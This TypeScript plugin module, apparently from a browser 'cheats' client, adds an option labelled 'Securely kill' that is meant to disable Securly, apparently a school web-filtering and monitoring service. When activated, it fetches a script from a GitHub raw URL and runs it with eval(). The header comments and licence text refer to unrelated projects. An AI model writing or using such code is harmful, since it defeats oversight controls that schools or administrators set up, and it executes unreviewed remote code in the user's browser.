// GO TO THEIR REPO
//
//
// https://github.com/Krazete/bookmarklets/blob/master/piano.js
//
//
//

import { moduleDefinition } from '../../moduleapi'

function kill() {
    console.log(
        'LICENSE AGREEMENT: The code used under the GPL-3.0 License. I have made no changes to the source code and I have taken the code from the official repository. Car axle client is under the GPL 3.0 license For more info see here: https://github.com/zek-c/Securly-Kill-V111/blob/main/LICENSE'
    )
    fetch('https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js')
        .then((r) => r.text())
        .then((r) => eval(r))
}

const plugin: moduleDefinition = {
    custom_render: false,
    display_name: 'Securely kill',
    id: 'securely',
    description: 'Kills securely. Run this on the securely website. See repo for better instructions (by <a href="https://github.com/zek-c" target="_blank">Zek-c</a>)',
    section: 'cheats',
    reset: true,
    onactive: kill,
}

export default plugin
